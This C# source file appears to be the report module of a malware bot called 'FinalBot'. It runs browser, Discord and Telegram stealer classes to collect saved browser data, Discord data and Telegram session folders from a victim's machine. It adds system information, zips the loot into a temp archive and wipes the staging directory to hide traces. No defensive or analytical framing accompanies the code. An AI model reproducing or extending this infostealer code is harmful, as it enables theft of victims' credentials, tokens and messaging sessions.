using System;
using System.IO;
using System.IO.Compression;
using System.Threading.Tasks;
using FinalBot.Stealers;
using FinalBot.Modules;

namespace FinalBot
{
    public static class ReportManager
    {
        public static async Task<string?> CreateFullReport()
        {
            string tempDir = Path.Combine(Path.GetTempPath(), $"Report_{DateTime.Now:yyyyMMdd_HHmmss}");
            Directory.CreateDirectory(tempDir);

            try 
            {
                // 1. Run Stealers
                var browserStealer = new BrowserStealer();
                string browserReport = await browserStealer.RunAll(); 
                File.WriteAllText(Path.Combine(tempDir, "Browsers.txt"), browserReport);

                var discordStealer = new DiscordStealer();
                string discordReport = await discordStealer.Run();
                File.WriteAllText(Path.Combine(tempDir, "Discord.txt"), discordReport);

                var telegramStealer = new TelegramStealer();
                string tgResult = telegramStealer.Run();
                if (!tgResult.StartsWith("❌") && Directory.Exists(tgResult))
                {
                    // If Telegram session found, move to report dir
                    Directory.Move(tgResult, Path.Combine(tempDir, "Telegram"));
                }

                // Others (assuming they might exist or handled similarly)
                // var fileStealer = new FileStealer();
                // await fileStealer.Run(tempDir);


                // 2. System Info
                string sysInfo = SystemInfoModule.GetSystemInfo();
                File.WriteAllText(Path.Combine(tempDir, "System_Info.txt"), sysInfo);

                // 3. ZIP everything
                string zipPath = tempDir + ".zip";
                if (File.Exists(zipPath)) File.Delete(zipPath);
                ZipFile.CreateFromDirectory(tempDir, zipPath);

                // 4. Cleanup temp dir
                WiperModule.WipeDirectory(tempDir);

                return zipPath;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[REPORT ERROR] {ex.Message}");
                return null;
            }
        }
    }
}
